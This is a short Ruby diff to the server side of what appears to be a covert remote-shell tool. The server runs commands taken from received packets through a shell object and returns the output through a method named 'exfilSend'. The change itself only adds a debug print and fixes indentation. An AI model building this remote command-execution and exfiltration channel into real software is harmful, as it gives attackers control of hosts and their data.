@@ -42,9 +42,10 @@ class Server
     puts "Client packet verified and recieved"
     pkt = Packet.parse p
     str += conn.servRecv(pkt)
-    puts str
+	puts str
     if str[str.length-1] == 10 || str[str.length-2] == 10 || str[str.length-3] == 10 || str[str.length-4] == 10 #aka newline
       result = @shell.executeCmd(str)
+	  puts "returend from executing shell command: #{str}result:\n#{result}"
       if result != nil
         conn.exfilSend(result)
       end
